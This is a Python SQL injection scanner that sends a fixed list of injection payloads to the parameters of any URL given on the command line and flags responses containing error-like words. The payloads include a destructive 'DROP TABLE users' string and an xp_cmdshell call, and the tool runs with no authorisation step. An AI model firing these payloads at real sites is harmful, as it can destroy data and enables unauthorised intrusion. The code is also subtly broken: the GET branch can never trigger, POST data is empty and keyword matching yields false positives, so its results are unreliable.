import requests
import sys
import re
import threading
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

# List of common SQLi payloads for error-based, time-based, and blind injections
payloads = [
    "' OR 1=1 --",  # Basic OR-based SQLi
    "' OR 'a'='a",  # Basic OR-based SQLi (alternative)
    "' UNION SELECT NULL, NULL, NULL --",  # Union-based SQLi
    "' OR 1=1#", 
    "' OR 1=1/*", 
    "'; DROP TABLE users; --",  # Dangerous payload to test
    "' AND 1=2 --",  # False condition for blind SQLi
    "' AND 1=2#",  # Another blind SQLi check
    "' WAITFOR DELAY '0:0:5' --",  # Time-based SQLi
    "'; EXEC xp_cmdshell('ping 127.0.0.1') --"  # Attempt to use xp_cmdshell
]

# Error messages to detect SQL injection
error_keywords = [
    "error", "syntax", "warning", "mysql", "sql", "unclosed", "unexpected", "invalid", "select", "database", "extract"
]

# Function to check for SQL injection in the response text
def detect_sqli(response_text):
    for keyword in error_keywords:
        if re.search(r"\b" + re.escape(keyword) + r"\b", response_text, re.IGNORECASE):
            return True
    return False

# Function to scan a URL for SQL injection vulnerabilities
def check_sqli(url, payload, method, headers, data):
    try:
        # Print the payload being tested
        print(f"TRYING PAYLOAD: {payload}")
        
        if method == 'GET':
            # Append payload to the URL
            parsed_url = urlparse(url)
            query_params = parse_qs(parsed_url.query)
            for key in query_params:
                query_params[key] = [payload]
            parsed_url = parsed_url._replace(query=urlencode(query_params, doseq=True))
            full_url = urlunparse(parsed_url)
            response = requests.get(full_url, headers=headers, timeout=5)

        elif method == 'POST':
            # Use the provided data with the payload
            if data:
                for key in data:
                    data[key] = payload
            response = requests.post(url, data=data, headers=headers, timeout=5)

        # Check for SQL error keywords in the response
        if detect_sqli(response.text):
            print(f"[Vulnerable] SQL injection detected with payload: {payload} on {url}")
            return True
        return False
    except requests.RequestException as e:
        print(f"[Error] Unable to reach URL: {e}")
        return False

# Function to scan parameters dynamically
def scan_parameters(url, headers, method, data=None):
    parsed_url = urlparse(url)
    params = parse_qs(parsed_url.query)

    # Scan all URL parameters
    for param in params:
        for payload in payloads:
            if check_sqli(url, payload, method, headers, data):
                print(f"[INFO] SQL injection detected on parameter: {param} with payload: {payload}")

# Function to scan POST data (form data)
def scan_post_data(url, headers, data):
    if data:
        for key in data:
            for payload in payloads:
                data_copy = data.copy()  # Avoid mutating the original data
                data_copy[key] = payload
                if check_sqli(url, payload, 'POST', headers, data_copy):
                    print(f"[INFO] SQL injection detected in POST parameter: {key} with payload: {payload}")

# Threading function to speed up the scanning process
def scan_in_thread(url, method, headers, data=None):
    if method == 'GET':
        scan_parameters(url, headers, 'GET', data)
    elif method == 'POST':
        scan_post_data(url, headers, data)

# Main function
def main():
    if len(sys.argv) < 2:
        print("Usage: python sqlscan.py <URL>")
        sys.exit(1)

    url = sys.argv[1]
    headers = {}  # You can extend this for custom headers (like User-Agent, Cookies, etc.)
    data = {}  # For POST requests, this can hold form data

    # Check if the URL contains GET parameters or POST data
    parsed_url = urlparse(url)
    if '?' in parsed_url.query:  # It's a GET request with parameters
        print(f"Scanning GET request for SQLi: {url}")
        scan_in_thread(url, 'GET', headers)
    else:  # POST request (you may need to adjust this to capture the form data)
        print(f"Scanning POST request for SQLi: {url}")
        scan_in_thread(url, 'POST', headers, data)

if __name__ == "__main__":
    main()
